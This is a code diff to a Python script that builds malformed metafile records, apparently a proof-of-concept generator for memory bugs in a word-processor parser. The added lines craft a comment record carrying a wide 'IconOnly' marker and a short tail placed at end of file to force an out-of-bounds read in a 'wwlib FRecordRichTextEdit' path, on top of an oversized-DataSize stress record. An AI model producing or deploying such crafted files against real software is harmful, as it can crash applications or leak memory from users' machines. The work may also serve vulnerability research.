@@ -64,9 +64,14 @@ def patch(path_in, path_out, stress=0x7FFF0000):
     # length-driven (memmem semantics -> scans declared DataSize/2 words) or
     # string-driven (stops at first NUL). 'A'*4096 contains no NUL.
     inj += build_comment(stress, b'A' * 4096)
+    # wwlib FRecordRichTextEdit path: cb matches wide L"IconOnly" at rec+0xC then
+    # copies a FIXED 256 bytes from rec+0xC regardless of nSize/DataSize.
+    # Marker + short tail, record placed last (EOF right after) -> OOB read.
+    inj += build_comment(0x20, (b'I\x00c\x00o\x00n\x00O\x00n\x00l\x00y\x00'
+                                + b'\x00\x00' + b'B' * 4))
     d[pos:pos] = inj
     nb, nr = struct.unpack_from('<II', d, 0x30)
-    struct.pack_into('<II', d, 0x30, nb + len(inj), nr + 2)
+    struct.pack_into('<II', d, 0x30, nb + len(inj), nr + 3)
     open(path_out, 'wb').write(bytes(d))
     print(f"patched {path_out} comments={len(comments)} injected=2 lastDataSize={hex(stress)}")
 
